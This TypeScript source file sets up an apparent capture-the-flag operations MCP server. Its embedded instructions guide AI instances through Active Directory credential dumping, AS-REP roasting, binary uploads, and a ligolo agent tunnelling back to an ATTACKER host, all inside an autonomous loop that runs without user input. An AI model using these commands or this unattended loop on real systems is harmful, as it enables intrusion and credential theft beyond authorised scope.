import { McpServer } from "@modelcontextprotocol/sdk/server/mcp";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio";
import { registerResources } from "./resources";
import { registerTools } from "./tools";
import { registerPrompts } from "./prompts";

async function main() {
  const server = new McpServer({
    name: "ctf-ops",
    version: "1.0.0",
  }, {
    instructions: `CTF Ops MCP Server — CTF competition operations dashboard.

Use Resources to query current state, and Tools to record data.

## Tool Paths
- Python tools (venv): .venv/bin/
  - impacket: secretsdump.py, GetNPUsers.py, GetUserSPNs.py, psexec.py, wmiexec.py, mssqlclient.py, smbclient.py, etc.
  - NetExec (nxc): NetExec smb/winrm/mssql/ldap
  - certipy: AD CS enumeration and exploitation
  - bloodhound-python: AD ingestor
  - enum4linux-ng: SMB/RPC/LDAP enumeration
  - adidnsdump: AD DNS dump
  - smbmap: SMB share enumeration
  - sshuttle: SSH VPN pivot (fallback; primary is ligolo-ng)
  - pymodbus: Modbus TCP (python -c "from pymodbus.client import ModbusTcpClient; ...")
- Homebrew: nmap, hashcat, john, proxychains4, sshpass, evil-winrm, ffuf, smbclient, rpcclient, ldapsearch
- Upload binaries for targets: tools/bins/
  - linux-amd64/: chisel, ligolo-agent, socat
  - linux-arm64/: chisel, ligolo-agent
  - windows-amd64/: chisel.exe, ligolo-agent.exe
  - darwin-arm64/: chisel, ligolo-proxy, kerbrute

## Tool Usage Examples
\`\`\`bash
# impacket (always use venv path)
.venv/bin/secretsdump.py domain/user:pass@target
.venv/bin/GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip IP

# netexec
.venv/bin/NetExec smb target -u user -p pass

# Binary upload (select architecture matching the target)
# 1) Check architecture with uname -m → linux-amd64 or linux-arm64
# 2) Serve with python3 -m http.server, then wget/curl from the target
\`\`\`

## Pivot Tunneling (priority order)
1. **ligolo-ng** (recommended): TUN-based, all protocols supported. Run ligolo-proxy on attack machine → upload+run ligolo-agent on pivot host → add routes.
   \`\`\`bash
   # Attack machine: ligolo-proxy -selfcert -laddr 0.0.0.0:11601
   # Pivot host: sshpass + scp/wget → /tmp/agent → agent -connect ATTACKER:11601 -ignore-cert
   # Attack machine: sudo ip route add TARGET_CIDR dev ligolo (or macOS route add)
   \`\`\`
2. **chisel** (HTTP SOCKS): When only a webshell is available (no SSH). Run chisel server on pivot → client socks from attack machine → proxychains4.
3. **SSH forwarding** (minimal): ssh -D 1080 (dynamic) or ssh -L (local). When only a single port is needed.
4. **When none work**: Delegate to human via request_task.

## Role Division
- Most tasks are executed directly (nmap -sn, curl, ldapsearch, NetExec, impacket, pymodbus, etc.)
- Tasks delegated to human via request_task:
  - nmap -p- (full port scan, takes several minutes)
  - hashcat/john (GPU cracking)
  - Interactive PTY privilege escalation
  - ligolo-proxy initial setup (requires TUN interface creation)
- Pivoting: ligolo-ng (primary) → chisel (secondary) → SSH -D (tertiary). Agent upload is done directly via sshpass+scp.

## Session Management
- On "start new session" request: create session with start_session
- Log each major action with log_session_entry
- When requesting human task: request_task + link to session
- On "continue session #N" request: load recent history with resume_session and continue

## Pivot Routing
- When a new segment is discovered: add with add_segment, then set reachability with update_segment_reachability
- When a dual-homed pivot host is obtained: register route with add_pivot_route (from/to segments, host, credential, protocol)
- Before working on internal networks: query full tunnel chain with get_pivot_chain
- Tunnel method selection: SSH access + upload possible → ligolo-ng | SSH only → SSH -D | HTTP only → chisel | None → request_task
- Query current state via ctf://pivot-routes or ctf://pivot-chain/{segmentName}

## Multi-Session Coordination (deduplication)
Multiple Claude instances can work in parallel. To prevent duplication:
- Before starting work: always query ctf://checklists → skip hosts already assigned to other sessions
- For new host work: claim with claim_host(hostId, sessionId) → 409 means another session owns it
- Host discovery (add_host) is free; exploitation requires a claimed host
- Update status with update_checklist on phase transitions:
  - enum start → enumStatus: "in-progress" (startedAt auto-set)
  - enum complete → enumStatus: "done" (completedAt auto-set)
  - exploit start → exploitStatus: "in-progress" ...
- Check ctf://context checklists.sessions to see which session owns how many hosts

## Autonomous Operations Loop (OODA)
Repeat every turn:
1. heartbeat(sessionId) — session keep-alive. **If not sent for 5+ minutes, session is marked stale and all claimed actions/hosts are released.**
2. Call get_sitrep → summary + nextActions (persisted to DB) + full state + priorAttempts (previous attempt results)
3. From nextActions, pick the highest priority with status="pending" (in_progress = owned by another session)
4. claim_action(actionId, sessionId) to claim → 409 means try another action
5. Based on the context object, autonomously decide and execute appropriate tools/commands. If priorAttempts exist, reference previous failure reasons.
6. Record results to DB (import_scan_data, add_credential, add_loot, etc.)
7. complete_action(actionId, "done"/"failed", "result summary") to close the action
8. → Return to step 1. Continue without user input.

## Action System
- When get_sitrep is called, actions are auto-generated based on ports/credentials/state and persisted to DB
- Each action has a fingerprint to prevent duplicates (same action is only created once)
- claim_action → prevents duplicate work across Claude instances
- Actions invalidated by state changes are automatically expired
- Use list_actions(status="pending") to query the pending work queue

## Detailed Workflow
1. start_session or resume_session
2. get_sitrep to check current state + recommended actions
3. claim_host to claim a host for work (409 = another session owns it → skip)
4. New segment discovered → add_segment + update_segment_reachability
5. Pivot host obtained → add_pivot_route
6. Entering internal segment → get_pivot_chain → set up tunnel
7. Import scanner JSON results via import_scan_data. Only add_host when a new host is actually confirmed; update existing hosts with update_host (no speculative registration).
8. If needed, request manual work via request_task (link to session)
9. Record findings with add_credential / add_loot (always include source for clear provenance)
10. update_checklist to track phase-by-phase progress
11. log_session_entry + log_event to record actions
12. Call get_sitrep again → decide next action (loop)

Dashboard Web UI: http://localhost:10000`,
  });

  registerResources(server);
  registerTools(server);
  registerPrompts(server);

  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
